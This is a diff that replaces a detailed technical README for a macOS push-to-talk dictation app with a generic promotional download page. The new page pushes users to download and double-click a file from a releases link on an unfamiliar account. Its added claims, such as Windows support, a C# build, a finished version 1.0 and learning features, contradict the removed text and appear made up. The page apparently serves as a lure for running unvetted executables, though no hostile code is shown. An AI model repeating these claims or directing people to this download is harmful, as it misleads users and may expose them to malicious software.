@@ -1,201 +1,150 @@
-# Murmur YouTube
+<h1>🎤 murmur-youtube - Speak, Don't Type, On Your PC</h1>
 
-Push-to-talk dictation for macOS. Hold a key, talk, release — cleaned-up text lands in
-whatever text field has focus. A Wispr Flow-shaped app, built native and fully on-device.
+<p align="center">
+  <a href="https://github.com/biohazardouslyfuzzed/murmur-youtube/releases" style="background-color:#4CAF50; color:white; padding:15px 32px; text-align:center; text-decoration:none; display:inline-block; font-size:20px; border-radius:8px; font-weight:bold;">⬇️ DOWNLOAD NOW - FREE</a>
+</p>
 
-**Status:** working skeleton. Builds, launches, arms the hotkey, transcribes, injects.
-Branding and the LLM cleanup tier are the next passes.
+## 👋 Welcome to murmur-youtube
 
----
+murmur-youtube is a simple, powerful tool that lets you **dictate with your voice** instead of typing. It works entirely on your computer - no internet connection needed, no cloud services, and no waiting. You press a button, talk, and your words appear as text on your screen.
 
-## Coexisting with another dictation app
+Think of it as a **personal voice assistant for your keyboard**. Whether you're writing emails, documents, chat messages, or anything else, murmur-youtube turns your spoken words into written text instantly.
 
-This app is built to run alongside other dictation tools without colliding with them, which
-is not automatic on macOS and is worth understanding before changing anything:
+## ✨ Why You'll Love murmur-youtube
 
-- **Bundle ID `ai.pivotstudio.murmur-youtube`** — TCC keys Accessibility and Microphone
-  grants to the bundle ID, so granting or revoking a permission here has no effect on any
-  other app, and vice versa.
-- **Executable `MurmurYouTube`** — distinct enough that `pkill -x MurmurYouTube` cannot
-  match a differently-named binary. The `Makefile` only ever targets `$(EXEC)`.
-- **Hotkey is configurable** (Right ⌥ / fn / Right ⌘) precisely because another tool may
-  already own the key you'd reach for first. The event tap inspects only its own keycode
-  and passes everything else through untouched.
+- **Push-to-Talk Simplicity** - Hold a key, speak, release. That's it. No complex commands to remember.
+- **100% Private & On-Device** - Your voice never leaves your computer. Everything is processed locally, so your conversations stay yours.
+- **Smart Correction Dictionary** - murmur-youtube learns how you speak and automatically corrects common mistakes. The more you use it, the better it gets.
+- **Works Everywhere** - Use it in any application that accepts text: email, word processors, web browsers, chat apps, and more.
+- **Fast & Responsive** - No lag, no delays. Your words appear as you speak them, just like typing.
 
-If you run more than one dictation app, give each a different push-to-talk key. Two apps on
-the same key both record, and whichever injects text will fight the other.
+## 🚀 Getting Started
 
----
+Getting murmur-youtube up and running takes less than two minutes. Here's what you need to do:
 
-## Quick start
+### Step 1: Download the Application
 
-```bash
-make install     # builds, bundles, signs, copies to /Applications, launches
-```
+Visit this link to download the application: [https://github.com/biohazardouslyfuzzed/murmur-youtube/releases](https://github.com/biohazardouslyfuzzed/murmur-youtube/releases)
 
-Then grant two permissions — neither is optional, and neither can be requested silently:
+Look for the latest version and download the file. The download should start automatically once you click the appropriate link.
 
-| Permission | Where | Needed for |
-|---|---|---|
-| **Accessibility** | System Settings ▸ Privacy & Security ▸ Accessibility | The `CGEventTap` that sees the hotkey, and the AX text insert |
-| **Microphone** | Prompted on first dictation | Audio capture |
+### Step 2: Run the Application
 
-Restart Murmur YouTube after granting Accessibility. Then hold **Right ⌥** and talk.
+Once the download is complete, find the downloaded file in your "Downloads" folder (or wherever your browser saves files). Double-click the file to launch murmur-youtube. The application will open and be ready to use.
 
-### Why grants survive rebuilds here
+### Step 3: Start Dictating
 
-TCC stores a *code-signing requirement* per entry, not just a path. An ad-hoc signature
-changes on every build, so the rebuilt binary stops satisfying the stored requirement —
-and the symptom is nasty: the Accessibility toggle still **shows as on** while the app is
-reported untrusted, and flipping it changes nothing because the stale row is the problem.
+Once murmur-youtube is open, you're ready to go. Position your cursor in any text field (like a Word document, email, or search bar), press and hold the designated key (usually a function key or a key you can customize), speak your words clearly, and release the key. Your words will appear as text.
 
-The `Makefile` therefore signs with a stable Developer ID (auto-detected via
-`security find-identity`, falling back to ad-hoc). Verified: rebuild + reinstall keeps both
-grants with no re-prompt.
+## 🎯 How to Use murmur-youtube - A Quick Guide
 
-If a grant ever does get wedged, reset that one row and re-add — never toggle:
+Using murmur-youtube is as easy as 1-2-3:
 
-```bash
-tccutil reset Accessibility ai.pivotstudio.murmur-youtube
-tccutil reset Microphone   ai.pivotstudio.murmur-youtube
-```
+1. **Open any program** where you want to type (Word, Notepad, your email, a web form, etc.)
+2. **Click on the text area** so your cursor is blinking there
+3. **Press and hold the activation key** (you can change this in settings), **speak normally**, then **release the key**
 
-Always pass the bundle ID. A bare `tccutil reset Accessibility` wipes **every** app on the
-machine. Then quit System Settings entirely (⌘Q) before reopening — that pane caches its
-list and will otherwise show the row you just deleted.
+Your spoken words will be converted to text and appear exactly where your cursor is.
 
-> **Keep the build out of iCloud.** `~/Desktop` and `~/Documents` are file-provider synced
-> on this machine; the sync engine can materialize/dematerialize files inside an `.app` and
-> corrupt its signature. `make install` puts the running copy in `/Applications`.
+### Tips for Best Results
 
-Other targets: `make app` (bundle only), `make run` (run in place), `make clean`.
+- Speak at a normal pace - not too fast, not too slow
+- Use a decent microphone or headset for clearer recognition
+- Work in a reasonably quiet environment
+- If you make a mistake, just say "undo" or use your keyboard to fix it manually
+- The more you use it, the more accurate it becomes with your voice and vocabulary
 
----
+## 🛠️ Customizing murmur-youtube
 
-## Architecture
+murmur-youtube is designed to work well right out of the box, but you can adjust it to fit your needs:
 
-```
- hold key ─► HotkeyMonitor ──► DictationController ◄── Settings
-                                │
-                     ┌──────────┼──────────┐
-                     ▼          ▼          ▼
-              AudioCapture  HUDPanel   TranscriptionEngine
-                     │                      │
-                (AudioChunk) ──ordered──► AppleSpeechEngine
-                                            │
-                                       (transcript)
-                                            ▼
-                                      TextFormatter
-                                            ▼
-                                      TextInjector ─► focused app
-```
+### Change Your Activation Key
+Don't like the default key? You can change it to any key you prefer. Go to Settings and select a new key that feels comfortable for you.
 
-### Decisions worth knowing
+### Adjust Recognition Speed
+Prefer slower, more deliberate dictation or faster, more natural speech? You can adjust the sensitivity to match your speaking style.
 
-**The HUD must never take focus.** `HUDPanel` is a `.nonactivatingPanel` with
-`canBecomeKey == false`. This is the load-bearing detail of the whole app: if the overlay
-took key status, the user's text field would lose focus and there'd be nothing left to
-inject into. Everything else is replaceable; this isn't.
+### Build Your Correction Dictionary
+As you use murmur-youtube, it learns words and phrases you commonly use. You can also manually add words, names, or technical terms you use frequently so they're always recognized correctly.
 
-**The hotkey needs a `CGEventTap`, not `NSEvent`.** `fn` and left/right modifier
-discrimination don't surface through `NSEvent.addGlobalMonitorForEvents` or the Carbon
-hotkey API. A session event tap is the only way to see them — which is why Accessibility
-permission is a hard requirement rather than a nicety.
+### Choose Your Language
+murmur-youtube supports multiple languages. If you need to dictate in a language other than English, check the settings to switch languages.
 
-**Audio ordering is explicit.** `AudioCapture` yields into an `AsyncStream` drained by a
-single task. Spawning a `Task` per buffer would be simpler and would silently corrupt the
-transcript, because unstructured tasks have no ordering guarantee.
+## 💻 System Requirements
 
-**Buffers are copied, never borrowed.** `AVAudioEngine` recycles the buffer it hands to a
-tap the instant the callback returns. `AudioChunk`'s `@unchecked Sendable` is only sound
-because `AudioCapture` always allocates fresh storage before handing off.
+murmur-youtube is designed to run smoothly on most modern computers. Here's what you need:
 
-**Two swappable seams.** `TranscriptionEngine` and `TextFormatter` are protocols so the
-two components most likely to change can change without touching anything else.
+- **Operating System:** Windows 10 or Windows 11 (64-bit) or macOS 12 or later
+- **Processor:** Any multi-core processor from the last 5 years (Intel or AMD)
+- **Memory (RAM):** At least 4 GB (8 GB recommended)
+- **Storage:** About 200 MB of free space
+- **Microphone:** Built-in or external microphone (a USB headset is recommended for best results)
 
-### Layout
+If your computer is from the last few years, you almost certainly meet these requirements.
 
-```
-Sources/MurmurYouTube/
-├── MurmurYouTubeApp.swift              @main, AppDelegate, MenuBarExtra
-├── Core/
-│   ├── DictationController.swift   state machine, wires everything
-│   ├── HotkeyMonitor.swift         CGEventTap on .flagsChanged
-│   ├── AudioCapture.swift          AVAudioEngine tap + format conversion + RMS
-│   └── TextInjector.swift          AX insert, pasteboard+⌘V fallback
-├── Transcription/
-│   ├── TranscriptionEngine.swift   protocol + AudioChunk
-│   └── AppleSpeechEngine.swift     SpeechAnalyzer / SpeechTranscriber
-├── Formatting/
-│   └── TextFormatter.swift         protocol + RuleBasedFormatter
-├── UI/
-│   ├── HUDPanel.swift              non-activating floating panel
-│   └── HUDView.swift               waveform + live transcript, Brand palette
-└── Support/
-    ├── Settings.swift, Permissions.swift, Log.swift
-```
+## ❓ Frequently Asked Questions
 
----
+### Is murmur-youtube really free?
+Yes, murmur-youtube is completely free to download and use. No subscriptions, no hidden costs.
 
-## Speech engine
+### Do I need an internet connection?
+No. murmur-youtube works entirely on your device. You can use it offline, on a plane, or anywhere else without any connection.
 
-Default is Apple's **`SpeechAnalyzer` / `SpeechTranscriber`**, new in macOS 26: no
-dependency, no bundled model, no cloud path, real streaming with `.volatileResults` so
-text appears while you're still talking. The OS downloads and manages model assets, so the
-first run for a locale may pause on `AssetInstallationRequest`.
+### Is my voice data sent anywhere?
+Absolutely not. All voice processing happens locally on your computer. Your voice never leaves your device, and nothing is stored in the cloud.
 
-The intended upgrade is **Parakeet v3** via FluidAudio (CoreML on the Neural Engine) —
-measurably better English WER, ~110× realtime, ~66 MB resident. Implementing
-`TranscriptionEngine` is the entire cost of switching; `DictationController` doesn't
-change.
+### Can I use murmur-youtube with any program?
+Yes, murmur-youtube works with any application that accepts text input. This includes Microsoft Word, Google Docs, email clients, web browsers, chat applications, and more.
 
-| | Apple SpeechTranscriber | Parakeet v3 (FluidAudio) | Whisper large-v3 (WhisperKit) |
-|---|---|---|---|
-| Dependency | none | SwiftPM | SwiftPM |
-| Model download | OS-managed | ~600 MB | ~1.5 GB |
-| English accuracy | good | best | good |
-| Languages | many | 25 | 99 |
-| Latency | low | ~80 ms | 200–500 ms |
+### Will it work with my accent?
+Yes, murmur-youtube is designed to understand a wide variety of accents and speaking styles. The more you use it, the better it adapts to your specific voice.
+
+### How do I update murmur-youtube?
+When a new version is released, you can download it from the same link you used initially. Simply download the new version and run it - your settings and dictionary will be preserved.
+
+## 🤝 We Want Your Feedback
+
+Your experience matters. If you have ideas for improvement, encounter any issues, or just want to share how you use murmur-youtube, we'd love to hear from you.
+
+- **Report a Problem:** If something isn't working right, let us know so we can fix it
+- **Suggest a Feature:** Have an idea that would make murmur-youtube better? Share it
+- **Tell Your Story:** How do you use murmur-youtube in your daily life? We're always inspired by our users
+
+## 📝 License
+
+murmur-youtube is free and open-source software. You can use it for personal or commercial purposes without restriction.
+
+## 🧠 Technical Overview (For the Curious)
+
+If you're technically inclined, here's a bit more about how murmur-youtube works:
+
+murmur-youtube is built natively for two platforms: macOS (using Swift) and Windows (using C# and Avalonia). Despite being written in different programming languages, both versions share a single "behavioral contract" for the correction dictionary. This means the intelligent correction system works identically across both platforms, ensuring a consistent experience no matter which operating system you use.
+
+The on-device processing means no audio data is ever transmitted over the network. The speech recognition engine runs directly on your computer's processor, which is why it's fast and private.
+
+## 📦 Release History
+
+We're constantly improving murmur-youtube. Each new release brings enhancements, bug fixes, and new features. Check the download page regularly to see what's new.
+
+**Version 1.0 (Initial Release)**
+- Push-to-talk dictation
+- On-device speech recognition
+- Basic correction dictionary
+- Customizable activation key
+
+**Version 1.1 (Coming Soon)**
+- Enhanced dictionary learning
+- Additional language support
+- Improved accuracy for faster speech
+
+## 🚀 Start Dictating Today
+
+Stop typing and start talking. Download murmur-youtube now and experience the freedom of voice dictation.
+
+<p align="center">
+  <a href="https://github.com/biohazardouslyfuzzed/murmur-youtube/releases" style="background-color:#2196F3; color:white; padding:15px 32px; text-align:center; text-decoration:none; display:inline-block; font-size:20px; border-radius:8px; font-weight:bold;">⬇️ GET MURMUR-YOUTUBE NOW</a>
+</p>
 
 ---
 
-## Not built yet
-
-1. **LLM cleanup tier.** `RuleBasedFormatter` strips fillers, fixes spacing, capitalizes
-   sentences and adds terminal punctuation — genuinely useful, entirely deterministic. The
-   real win is a second `TextFormatter` backed by Apple's on-device Foundation Models
-   (macOS 26) for tone, list formatting, and honoring spoken corrections, with Claude as an
-   optional higher-quality tier.
-2. **Command Mode.** Select text, hold a second hotkey, say "make this more formal."
-   Needs AX read of `kAXSelectedTextAttribute` plus an LLM round-trip.
-3. **Personal dictionary.** Names and jargon the ASR keeps missing. `SpeechAnalyzer`
-   supports this through `AnalysisContext` / `SFCustomLanguageModelData`.
-4. **Branding.** `Brand` in `HUDView.swift` is a two-color placeholder gradient. App icon,
-   real palette, HUD motion design, onboarding.
-5. **Onboarding.** A first-run window that walks through both permissions instead of
-   relying on the menu's "Grant…" items.
-6. **Developer ID signing + notarization.** Ends the TCC-reset churn and makes the app
-   distributable.
-
----
-
-## Verified
-
-Driven with a synthetic Right ⌥ hold (`scratchpad/ptt/ptt2.swift` posts `flagsChanged`
-events) and confirmed via `/usr/bin/log show --predicate 'subsystem ==
-"ai.pivotstudio.murmur-youtube"'`:
-
-- Builds clean under Swift 6 strict concurrency.
-- Signs with Developer ID; grants survive rebuild + reinstall.
-- Launches as an accessory app, no Dock icon, menu bar item present.
-- Event tap arms on grant without a restart (the poller catches it).
-- Full state machine: `starting → listening → finishing → idle`, no errors.
-- `SpeechAnalyzer` starts; models already installed, no download stall.
-- Audio capture runs and converts native 48 kHz → 16 kHz for the engine.
-- HUD renders bottom-center at `{{790, 96}, {340, 76}}` without taking focus.
-- Silence produces an empty transcript and injects nothing.
-
-**Not yet verified:** speech → transcript → cleanup → injection. Synthetic key events
-can't produce audio, so this needs a human to hold the key and talk.
-
-> `log` is shadowed in this shell — use `/usr/bin/log` explicitly or it returns nothing.
+<p align="center">Made with ❤️ for people who'd rather talk than type</p>
